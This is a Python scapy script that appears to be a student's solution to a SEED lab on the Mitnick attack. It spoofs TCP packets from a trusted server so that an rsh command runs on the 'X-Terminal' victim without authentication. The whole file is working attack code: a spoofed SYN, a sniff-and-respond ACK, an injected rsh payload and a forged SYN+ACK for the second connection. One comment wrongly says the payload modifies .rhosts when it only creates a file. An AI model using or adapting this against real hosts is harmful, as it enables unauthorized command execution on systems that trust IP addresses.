#!/usr/bin/python3
from scapy.all import *

x_ip = "10.9.0.5"  # X-Terminal
x_port = 514  # Port number used by X-Terminal
x_port1 = 1023
srv_ip = "10.9.0.6"  # The trusted server
srv_port = 1023  # Port number used by the trusted server
srv_port1 = 9090

def spoof_pkt(pkt):
    print("spoof_pkt triggered")
    old_ip = pkt[IP]
    old_tcp = pkt[TCP]
    Seq = old_tcp.ack
    tcp_len = old_ip.len - old_ip.ihl*4 - old_tcp.dataofs*4
    print(f"{old_ip.src}:{old_tcp.sport} -> {old_ip.dst}:{old_tcp.dport} Flags={old_tcp.flags} Len={tcp_len}")

    # Send spoofed ACK packet when SYN+ACK packet is detected
    if old_tcp.flags == "SA":
        print("Sending spoofed ACK packet to the X-Terminal (Victim)")
        ip = IP(src=srv_ip, dst=x_ip)  # Sending ACK
        tcp = TCP(sport=srv_port, dport=x_port, flags="A", seq=Seq, ack=old_ip.seq + 1)
        pkt = ip/tcp
        send(pkt, iface="br-434e92429c36", verbose=1)

        # Sending spoofed RSH data packet after sending ACK packet to X-terminal
        print("Sending Spoofed RSH Data Packet to the X-Terminal (victim)")
        data = '9090\x00seed\x00seed\x00touch  /tmp/pooja.txt\x00'  # This command modifies .rhosts
        pkt = ip/tcp/data
        send(pkt, iface="br-434e92429c36", verbose=1)

    if old_tcp.flags == "S" and old_tcp.dport == srv_port1 and old_ip.dst == srv_ip:
        Seqence = 323456788
        print("Sending spoofed SYN+ACK packet to the X-Terminal (Victim)")
        ip = IP(src=srv_ip, dst=x_ip)
        tcp = TCP(sport=srv_port1, dport=x_port1, flags="SA", seq=Seqence, ack=old_ip.seq + 1)
        pkt = ip/tcp
        send(pkt, iface="br-434e92429c36", verbose=1)

# This function sends a spoofed SYN packet to the X-terminal acting as the trusted server
def spoofing_SYNPacket():
    print("Sending spoofed SYN packet to X-terminal (victim)")
    ip = IP(src=srv_ip, dst=x_ip)  # src is trusted server and dst is victim
    tcp = TCP(sport=srv_port, dport=x_port, flags="S", seq=323456789)
    pkt = ip/tcp
    send(pkt, iface="br-434e92429c36", verbose=1)

def main():
    spoofing_SYNPacket()
    sniff(filter="tcp and src host 10.9.0.5",iface="br-434e92429c36", prn=spoof_pkt)

if __name__ == "__main__":
    main()
